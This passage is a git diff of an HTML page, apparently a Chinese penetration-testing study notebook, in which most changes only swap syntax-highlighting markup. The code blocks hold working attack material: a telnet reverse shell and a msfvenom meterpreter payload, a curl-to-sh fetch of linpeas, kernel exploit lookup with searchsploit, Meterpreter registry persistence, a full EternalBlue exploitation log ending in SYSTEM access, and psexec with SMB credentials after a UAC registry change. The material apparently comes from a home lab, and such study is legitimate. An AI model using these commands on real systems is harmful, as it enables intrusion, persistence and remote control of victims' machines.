 <p>msfvenom -p python&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.1.120 LPORT&#x3D;6666</p>
 <p>或者 ：handler -p python&#x2F;meterpreter&#x2F;reverse_tcp -H 192.168.1.120 -p 6666</p>
 <p>或者查找msfvenom支持python的payloads</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -l payloads | grep &quot;python&quot; | awk &quot;&#123;print \$1&#125;&quot;</span><br></pre></td></tr></table></figure>
+<figure class="highlight coq"><table><tr><td class="code"><pre><code class="hljs coq">msfvenom -l payloads | <span class="hljs-type">grep</span> <span class="hljs-string">&quot;python&quot;</span> | <span class="hljs-type">awk</span> <span class="hljs-string">&quot;&#123;print \$1&#125;&quot;</span><br></code></pre></td></tr></table></figure>
 
 <h5 id="6-python"><a href="#6-python" class="headerlink" title="6)python"></a>6)python</h5><h5 id="7-telnet"><a href="#7-telnet" class="headerlink" title="7)telnet"></a>7)telnet</h5><p>telnet生成反弹shell的方式同nc</p>
 <p>控制端：</p>
 <p>nc -lvvp 6666</p>
 <p>被控制端：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm -f a; mknod a p;telnet 192.168.1.120 6666 0&lt;a | /bin/bash  1&gt;a  2&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">rm</span> -f a; mknod a p;telnet <span class="hljs-number">192.168.1.120</span> <span class="hljs-number">6666</span> <span class="hljs-number">0</span>&lt;a | /bin/bash  <span class="hljs-number">1</span>&gt;a  <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
 
 <p>或者</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm -f a &amp;&amp;  mknod a p &amp;&amp;telnet 192.168.1.120 6666 0&lt;a | /bin/bash  1&gt;a  2&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">rm</span> -f a &amp;&amp;  mknod a p &amp;&amp;telnet <span class="hljs-number">192.168.1.120</span> <span class="hljs-number">6666</span> <span class="hljs-number">0</span>&lt;a | /bin/bash  <span class="hljs-number">1</span>&gt;a  <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
 
 <h5 id="8-openssl"><a href="#8-openssl" class="headerlink" title="8)openssl"></a>8)openssl</h5><p>openssl，厂商一般都有流量监控设备，直接传输报文会被审查到</p>
 <p>steps:</p>
 <ul>
 <li><p><input disabled="" type="checkbox"> 
 在控制端生成密钥文件</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes</span><br></pre></td></tr></table></figure>
+<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">openssl</span> req -x509 -newkey rsa:<span class="hljs-number">4096</span> -keyout key.pem -out cert.pem -days <span class="hljs-number">365</span> -nodes<br></code></pre></td></tr></table></figure>
 
 
 </li>
 <li><p><input disabled="" type="checkbox"> 
 在远程控制端启动监视器</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl s_server -quiet -key key.pem  -cert cert.pem -port 443</span><br></pre></td></tr></table></figure>
+<figure class="highlight lsl"><table><tr><td class="code"><pre><code class="hljs lsl">openssl s_server -quiet -<span class="hljs-type">key</span> <span class="hljs-type">key</span>.pem  -cert cert.pem -port <span class="hljs-number">443</span><br></code></pre></td></tr></table></figure>
 
 
 </li>
@@ -406,7 +612,7 @@
 <p>cat &#x2F;etc&#x2F;my.conf</p>
 <p>cat &#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf</p>
 <p>cat &#x2F;opt&#x2F;lampp&#x2F;etc&#x2F;httpd.conf</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -alR /etc/ | awk &#x27;$1~/^.*r.*/&#x27;</span><br></pre></td></tr></table></figure>
+<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">ls -alR <span class="hljs-regexp">/etc/</span> | awk <span class="hljs-string">&#x27;$1~/^.*r.*/&#x27;</span><br></code></pre></td></tr></table></figure>
 
 
 
@@ -484,11 +690,11 @@
 <h6 id="2-searchsploit-工具"><a href="#2-searchsploit-工具" class="headerlink" title="2) searchsploit 工具"></a>2) searchsploit 工具</h6><p>searchexploit是一个检索exp信息的工具，他将在exploit-db.com中检索可以使用的信息</p>
 <p>实例</p>
 <p>step0 目标机信息收集</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -s -L  http://192.168.1.200/webload/wintool/linpeas.sh | sh</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">curl -s -L  http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">1.200</span><span class="hljs-regexp">/webload/</span>wintool/linpeas.sh | sh<br><br></code></pre></td></tr></table></figure>
 
 
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[thaygo@MiWiFi-R4CM-srv home]$ uname -mrs</span><br><span class="line">Linux 4.18.0-348.el8.x86_64 x86_64</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight llvm"><table><tr><td class="code"><pre><code class="hljs llvm">[thaygo<span class="hljs-title">@MiWiFi-R4CM-srv</span> home]$ uname -mrs<br>Linux <span class="hljs-number">4.18</span>.<span class="hljs-number">0</span><span class="hljs-number">-348</span>.el<span class="hljs-number">8</span>.<span class="hljs-keyword">x</span><span class="hljs-number">86</span>_<span class="hljs-number">64</span> <span class="hljs-keyword">x</span><span class="hljs-number">86</span>_<span class="hljs-number">64</span><br><br></code></pre></td></tr></table></figure>
 
 <p>内核版本 linux 4.18.0</p>
 <p>step 1更新searchsploit</p>
@@ -496,7 +702,7 @@
 <p>更新需要的space比较大，请确认disk有足够的空间</p>
 <p>step 2 搜索响应的内核版本</p>
 <p>searchsploit linux kernel 4.18.0</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit linux kernel 4.18.0</span><br></pre></td></tr></table></figure>
+<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">searchsploit</span> linux kernel <span class="hljs-number">4</span>.<span class="hljs-number">18</span>.<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure>
 
 <p><img src="C:\Users\Thaygo\AppData\Roaming\Typora\typora-user-images\image-20220603155009987.png" alt="image-20220603155009987"></p>
 <p>searchsploit搜索结果如图所示，比较内核版本4.18.0 介于其中的4.10.0 &lt;5.1.17版本之间，且从该漏洞的描述可知，该代码是用来进行本地提权的，所以可以用在本系统，搜索结果的右半块是 利用代码的路径</p>
@@ -507,7 +713,7 @@
 <p>gcc 47163.c -o exp.4.18.0</p>
 <h2 id="section-5-2-windows后渗透攻击方式"><a href="#section-5-2-windows后渗透攻击方式" class="headerlink" title="section 5.2 windows后渗透攻击方式"></a>section 5.2 windows后渗透攻击方式</h2><h3 id="part-2-Windows-权限维持"><a href="#part-2-Windows-权限维持" class="headerlink" title="part 2 Windows 权限维持"></a>part 2 Windows 权限维持</h3><h4 id="3）meterpreter权限维持—–persistence模块"><a href="#3）meterpreter权限维持—–persistence模块" class="headerlink" title="3）meterpreter权限维持—–persistence模块"></a>3）meterpreter权限维持—–persistence模块</h4><p>使用下面命令生成的后面呢payload,会添加到自启动注册表</p>
 <p>run persistence -U -S -X -P  [payload] -i [time retry connect] -p [rport] -r [rhost] -L [localdir]</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run persistence -S -i 5 -p 6666 -r 192.168.1.11 -L C:\\windows\\system32\\</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">run</span> persistence -S -i <span class="hljs-number">5</span> -p <span class="hljs-number">6666</span> -r <span class="hljs-number">192.168.1.11</span> -L C:\\windows\\system32\\<br><br><br></code></pre></td></tr></table></figure>
 
 <p>该命令添加自启动注册表位置：</p>
 <p>HKLM\Software\Microsoft\Windows\CurrentVersion\Run</p>
@@ -529,21 +735,21 @@
 <h4 id="04-task-powershell"><a href="#04-task-powershell" class="headerlink" title="04 task-powershell"></a>04 task-powershell</h4><h2 id="Section-6系统日志清理"><a href="#Section-6系统日志清理" class="headerlink" title="Section 6系统日志清理"></a>Section 6系统日志清理</h2><p>Windows eventvwr</p>
 <h2 id="Section-4-实战"><a href="#Section-4-实战" class="headerlink" title="Section 4 实战"></a>Section 4 实战</h2><h3 id="实战1-利用永恒之蓝漏洞实战攻击"><a href="#实战1-利用永恒之蓝漏洞实战攻击" class="headerlink" title="实战1 利用永恒之蓝漏洞实战攻击"></a>实战1 利用永恒之蓝漏洞实战攻击</h3><p>永恒之蓝是指2017年4月14日晚，黑客团体Shadow Brokers（影子经纪人）公布一大批网络攻击工具，其中包含“永恒之蓝”工具，“永恒之蓝”利用Windows系统的SMB漏洞可以获取系统最高权限。5月12日，不法分子通过改造“永恒之蓝”制作了wannacry勒索病毒，<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E8%8B%B1%E5%9B%BD/144602">英国</a>、<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E4%BF%84%E7%BD%97%E6%96%AF/125568">俄罗斯</a>、整个<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%AC%A7%E6%B4%B2/145550">欧洲</a>以及中国国内多个高校校内网、大型企业内网和政府机构专网中招，被勒索支付高额赎金才能解密恢复文件。</p>
 <h4 id="step-1-使用metasploit-辅助模块测试靶机渗透可行性"><a href="#step-1-使用metasploit-辅助模块测试靶机渗透可行性" class="headerlink" title="step 1.使用metasploit 辅助模块测试靶机渗透可行性"></a>step 1.使用metasploit 辅助模块测试靶机渗透可行性</h4><p><strong>auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms 17_010</strong>扫描辅助模块</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; run</span><br><span class="line"></span><br><span class="line">[+] 192.168.1.148:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Home Basic 7600 x64 (64-bit)</span><br><span class="line">[*] 192.168.1.148:445     - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight mipsasm"><table><tr><td class="code"><pre><code class="hljs mipsasm">msf6 auxiliary(<span class="hljs-keyword">scanner/smb/smb_ms17_010) </span>&gt; run<br><br>[+] <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">148</span>:<span class="hljs-number">445</span>     - Host is likely VULNERABLE to MS17<span class="hljs-number">-010</span>! - Windows <span class="hljs-number">7</span> Home <span class="hljs-keyword">Basic </span><span class="hljs-number">7600</span> x64 (<span class="hljs-number">64</span>-<span class="hljs-keyword">bit)</span><br><span class="hljs-keyword"></span>[*] <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">148</span>:<span class="hljs-number">445</span>     - <span class="hljs-keyword">Scanned </span><span class="hljs-number">1</span> of <span class="hljs-number">1</span> hosts (<span class="hljs-number">100</span>% complete)<br>[*] Auxiliary module execution completed<br>msf6 auxiliary(<span class="hljs-keyword">scanner/smb/smb_ms17_010) </span>&gt; <br><br></code></pre></td></tr></table></figure>
 
 
 
 <h4 id="step-2-获取win7系统后门"><a href="#step-2-获取win7系统后门" class="headerlink" title="step 2.获取win7系统后门"></a>step 2.获取win7系统后门</h4><p><strong>攻击模块：exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue</strong></p>
 <p><strong>payload模块：windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">[*] Using configured payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">msf6 auxiliary(scanner<span class="hljs-regexp">/smb/</span>smb_ms17_010) &gt; use exploit<span class="hljs-regexp">/windows/</span>smb/ms17_010_eternalblue<br>[*] Using configured payload windows<span class="hljs-regexp">/x64/m</span>eterpreter/reverse_tcp<br>msf6 exploit(windows<span class="hljs-regexp">/smb/m</span>s17_010_eternalblue) &gt; <br><br></code></pre></td></tr></table></figure>
 
 <p>注：攻击负载模块，可以通过windows&#x2F;x64&#x2F;shell搜索到的reverse_tcp</p>
-<h4 id="step-3-拿到后门"><a href="#step-3-拿到后门" class="headerlink" title="step 3.拿到后门"></a>step 3.拿到后门</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set rhosts 192.168.1.148</span><br><span class="line">rhosts =&gt; 192.168.1.148</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.11:4444 </span><br><span class="line">[*] 192.168.1.148:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check</span><br><span class="line">[+] 192.168.1.148:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Home Basic 7600 x64 (64-bit)</span><br><span class="line">[*] 192.168.1.148:445     - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[+] 192.168.1.148:445 - The target is vulnerable.</span><br><span class="line">[*] 192.168.1.148:445 - Connecting to target for exploitation.</span><br><span class="line">[+] 192.168.1.148:445 - Connection established for exploitation.</span><br><span class="line">[+] 192.168.1.148:445 - Target OS selected valid for OS indicated by SMB reply</span><br><span class="line">[*] 192.168.1.148:445 - CORE raw buffer dump (25 bytes)</span><br><span class="line">[*] 192.168.1.148:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 48 6f 6d 65 20 42  Windows 7 Home B</span><br><span class="line">[*] 192.168.1.148:445 - 0x00000010  61 73 69 63 20 37 36 30 30                       asic 7600       </span><br><span class="line">[+] 192.168.1.148:445 - Target arch selected valid for arch indicated by DCE/RPC reply</span><br><span class="line">[*] 192.168.1.148:445 - Trying exploit with 12 Groom Allocations.</span><br><span class="line">[*] 192.168.1.148:445 - Sending all but last fragment of exploit packet</span><br><span class="line">[*] 192.168.1.148:445 - Starting non-paged pool grooming</span><br><span class="line">[+] 192.168.1.148:445 - Sending SMBv2 buffers</span><br><span class="line">[+] 192.168.1.148:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.</span><br><span class="line">[*] 192.168.1.148:445 - Sending final SMBv2 buffers.</span><br><span class="line">[*] 192.168.1.148:445 - Sending last fragment of exploit packet!</span><br><span class="line">[*] 192.168.1.148:445 - Receiving response from exploit packet</span><br><span class="line">[+] 192.168.1.148:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!</span><br><span class="line">[*] 192.168.1.148:445 - Sending egg to corrupted connection.</span><br><span class="line">[*] 192.168.1.148:445 - Triggering free of corrupted buffer.</span><br><span class="line">[*] Sending stage (200262 bytes) to 192.168.1.148</span><br><span class="line">[*] Meterpreter session 2 opened (192.168.1.11:4444 -&gt; 192.168.1.148:49172 ) at 2022-05-16 22:39:29 +0800</span><br><span class="line">[+] 192.168.1.148:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[+] 192.168.1.148:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[+] 192.168.1.148:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h4 id="step-3-拿到后门"><a href="#step-3-拿到后门" class="headerlink" title="step 3.拿到后门"></a>step 3.拿到后门</h4><figure class="highlight dns"><table><tr><td class="code"><pre><code class="hljs dns">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set rhosts <span class="hljs-number">192.168.1.148</span><br>rhosts =&gt; <span class="hljs-number">192.168.1.148</span><br>msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; run<br><br>[*] Started reverse TCP handler on <span class="hljs-number">192.168.1.11</span>:<span class="hljs-number">4444</span> <br>[*] <span class="hljs-number">192.168.1.148</span>:<span class="hljs-number">445</span> - Using auxiliary/scanner/smb/smb_ms17_010 as check<br>[+] <span class="hljs-number">192.168.1.148</span>:<span class="hljs-number">445</span>     - Host is likely VULNERABLE to MS17-<span class="hljs-number">010</span>! - Windows <span class="hljs-number">7</span> Home Basic <span class="hljs-number">7600</span> x64 (<span class="hljs-number">64</span>-bit)<br>[*] <span class="hljs-number">192.168.1.148</span>:<span class="hljs-number">445</span>     - Scanned <span class="hljs-number">1</span> of <span class="hljs-number">1</span> hosts (<span class="hljs-number">100</span>% complete)<br>[+] <span class="hljs-number">192.168.1.148</span>:<span class="hljs-number">445</span> - The target is vulnerable.<br>[*] <span class="hljs-number">192.168.1.148</span>:<span class="hljs-number">445</span> - Connecting to target for exploitation.<br>[+] <span class="hljs-number">192.168.1.148</span>:<span class="hljs-number">445</span> - Connection established for exploitation.<br>[+] <span class="hljs-number">192.168.1.148</span>:<span class="hljs-number">445</span> - Target OS selected valid for OS indicated by SMB reply<br>[*] <span class="hljs-number">192.168.1.148</span>:<span class="hljs-number">445</span> - CORE raw buffer dump (<span class="hljs-number">25</span> bytes)<br>[*] <span class="hljs-number">192.168.1.148</span>:<span class="hljs-number">445</span> - <span class="hljs-number">0x00000000</span>  <span class="hljs-number">57</span> <span class="hljs-number">69</span> <span class="hljs-number">6</span>e <span class="hljs-number">64</span> <span class="hljs-number">6</span>f <span class="hljs-number">77 73 20 37</span> <span class="hljs-number">20</span> <span class="hljs-number">48</span> <span class="hljs-number">6</span>f <span class="hljs-number">6d</span> <span class="hljs-number">65</span> <span class="hljs-number">20</span> <span class="hljs-number">42</span>  Windows <span class="hljs-number">7</span> Home B<br>[*] <span class="hljs-number">192.168.1.148</span>:<span class="hljs-number">445</span> - <span class="hljs-number">0x00000010</span>  <span class="hljs-number">61 73 69 63</span> <span class="hljs-number">20 37 36 30</span> <span class="hljs-number">30</span>                       asic <span class="hljs-number">7600</span>       <br>[+] <span class="hljs-number">192.168.1.148</span>:<span class="hljs-number">445</span> - Target arch selected valid for arch indicated by DCE/RPC reply<br>[*] <span class="hljs-number">192.168.1.148</span>:<span class="hljs-number">445</span> - Trying exploit with <span class="hljs-number">12</span> Groom Allocations.<br>[*] <span class="hljs-number">192.168.1.148</span>:<span class="hljs-number">445</span> - Sending all but last fragment of exploit packet<br>[*] <span class="hljs-number">192.168.1.148</span>:<span class="hljs-number">445</span> - Starting non-paged pool grooming<br>[+] <span class="hljs-number">192.168.1.148</span>:<span class="hljs-number">445</span> - Sending SMBv2 buffers<br>[+] <span class="hljs-number">192.168.1.148</span>:<span class="hljs-number">445</span> - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.<br>[*] <span class="hljs-number">192.168.1.148</span>:<span class="hljs-number">445</span> - Sending final SMBv2 buffers.<br>[*] <span class="hljs-number">192.168.1.148</span>:<span class="hljs-number">445</span> - Sending last fragment of exploit packet!<br>[*] <span class="hljs-number">192.168.1.148</span>:<span class="hljs-number">445</span> - Receiving response from exploit packet<br>[+] <span class="hljs-number">192.168.1.148</span>:<span class="hljs-number">445</span> - ETERNALBLUE overwrite completed successfully (<span class="hljs-number">0</span>xC000000D)!<br>[*] <span class="hljs-number">192.168.1.148</span>:<span class="hljs-number">445</span> - Sending egg to corrupted connection.<br>[*] <span class="hljs-number">192.168.1.148</span>:<span class="hljs-number">445</span> - Triggering free of corrupted buffer.<br>[*] Sending stage (<span class="hljs-number">200262</span> bytes) to <span class="hljs-number">192.168.1.148</span><br>[*] Meterpreter session <span class="hljs-number">2</span> opened (<span class="hljs-number">192.168.1.11</span>:<span class="hljs-number">4444</span> -&gt; <span class="hljs-number">192.168.1.148</span>:<span class="hljs-number">49172</span> ) at <span class="hljs-number">2022-05-16</span> <span class="hljs-number">22</span>:<span class="hljs-number">39</span>:<span class="hljs-number">29</span> +<span class="hljs-number">0800</span><br>[+] <span class="hljs-number">192.168.1.148</span>:<span class="hljs-number">445</span> - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=<br>[+] <span class="hljs-number">192.168.1.148</span>:<span class="hljs-number">445</span> - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=<br>[+] <span class="hljs-number">192.168.1.148</span>:<span class="hljs-number">445</span> - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=<br><br><br></code></pre></td></tr></table></figure>
 
 
 
 <h4 id="step-4-后门操作"><a href="#step-4-后门操作" class="headerlink" title="step 4.后门操作"></a>step 4.后门操作</h4><p>1.查看用户权限</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql">meterpreter &gt; getuid<br><span class="hljs-keyword">Server</span> username: NT AUTHORITY\<span class="hljs-keyword">SYSTEM</span><br><br></code></pre></td></tr></table></figure>
 
 <p>windows 三类权限</p>
 <p>system &gt; administrator &gt; guest		当前拿到的是win7的最高权限</p>
@@ -569,26 +775,26 @@
 <p>cmd.exe &#x2F;k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System &#x2F;v LocalAccountTokenFilterPolicy &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f</p>
 <p>先将session放到后台 background</p>
 <p>扩展：psexec实用程序需要在远程系统上需要做一些事情：SMB 消息块协议(SMB）必须可用，并且可以访问；必须启用文件和打印共享，Admin$必须可以访问，它是一个隐藏的SMB共享，它映射到windows目录，用于软件部署。体哦那个psexec实用程序的凭据必须具有访问Admin$共享的权限。psexec可执行文件内部有windows服务镜像，它接受此服务，并将其部署到远程计算机的Admin$共享中，然后他使用SMB上的DCE&#x2F;RPC(分布式计算环境&#x2F;远程环境调用)接口来访问Windows Service Control Manager API,他将打开远程计算机上的psexec程序，然后psexec程序创建一个可用于将命令发送到系统的命名管道，</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; use exploit/windows/smb/psexec</span><br><span class="line">[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(windows/smb/psexec) &gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">msf6 exploit(windows<span class="hljs-regexp">/smb/m</span>s17_010_eternalblue) &gt; use exploit<span class="hljs-regexp">/windows/</span>smb/psexec<br>[*] No payload configured, defaulting to windows<span class="hljs-regexp">/meterpreter/</span>reverse_tcp<br>msf6 exploit(windows<span class="hljs-regexp">/smb/</span>psexec) &gt; <br><br></code></pre></td></tr></table></figure>
 
 <p>修改参数</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">msf6 exploit(windows/smb/psexec) &gt; set RHOSTS 192.168.1.148</span><br><span class="line">RHOSTS =&gt; 192.168.1.148</span><br><span class="line">msf6 exploit(windows/smb/psexec) &gt; set SMBUSER root</span><br><span class="line">SMBUSER =&gt; root</span><br><span class="line">msf6 exploit(windows/smb/psexec) &gt; set SMBPASS 123456</span><br><span class="line">SMBPASS =&gt; 123456</span><br><span class="line">msf6 exploit(windows/smb/psexec) &gt; show options</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight gams"><table><tr><td class="code"><pre><code class="hljs gams"><br>msf6 exploit(windows/smb/psexec) &gt; <span class="hljs-keyword">set</span> RHOSTS <span class="hljs-comment">192.168.1.148</span><br>RHOSTS <span class="hljs-comment">=&gt; 192.168.1.148</span><br>msf6 <span class="hljs-comment">exploit(windows</span>/smb/<span class="hljs-comment">psexec) &gt; set SMBUSER root</span><br>SMBUSER <span class="hljs-comment">=&gt; root</span><br>msf6 <span class="hljs-comment">exploit(windows</span>/smb/<span class="hljs-comment">psexec) &gt; set SMBPASS 123456</span><br>SMBPASS <span class="hljs-comment">=&gt; 123456</span><br>msf6 <span class="hljs-comment">exploit(windows</span>/smb/<span class="hljs-comment">psexec) &gt; show options</span><br><br><br></code></pre></td></tr></table></figure>
 
 <p>注意，此处用户账号&#x2F;密码必须设置！用户组，如果主机在用户组中，必须设置。</p>
 <p>session创建后，通过sysinfo可以查看主机是否在域中</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">meterpreter &gt; sysinfo</span><br><span class="line">Computer        : WIN-M2F2TMRU139</span><br><span class="line">OS              : Windows 7 (6.1 Build 7600).</span><br><span class="line">Architecture    : x64</span><br><span class="line">System Language : zh_CN</span><br><span class="line">Domain          : WORKGROUP</span><br><span class="line">Logged On Users : 4</span><br><span class="line">Meterpreter     : x86/windows</span><br><span class="line">meterpreter &gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight yaml"><table><tr><td class="code"><pre><code class="hljs yaml"><br><span class="hljs-string">meterpreter</span> <span class="hljs-string">&gt;</span> <span class="hljs-string">sysinfo</span><br><span class="hljs-attr">Computer        :</span> <span class="hljs-string">WIN-M2F2TMRU139</span><br><span class="hljs-attr">OS              :</span> <span class="hljs-string">Windows</span> <span class="hljs-number">7</span> <span class="hljs-string">(6.1</span> <span class="hljs-string">Build</span> <span class="hljs-number">7600</span><span class="hljs-string">).</span><br><span class="hljs-attr">Architecture    :</span> <span class="hljs-string">x64</span><br><span class="hljs-attr">System Language :</span> <span class="hljs-string">zh_CN</span><br><span class="hljs-attr">Domain          :</span> <span class="hljs-string">WORKGROUP</span><br><span class="hljs-attr">Logged On Users :</span> <span class="hljs-number">4</span><br><span class="hljs-attr">Meterpreter     :</span> <span class="hljs-string">x86/windows</span><br><span class="hljs-string">meterpreter</span> <span class="hljs-string">&gt;</span> <br><br></code></pre></td></tr></table></figure>
 
 <p>Domain :WORKGROUP	值为工作组，不在域中</p>
 <p><strong>下面我们配置一个后门程序，修改UAC的注册表，需要重启才能生效</strong></p>
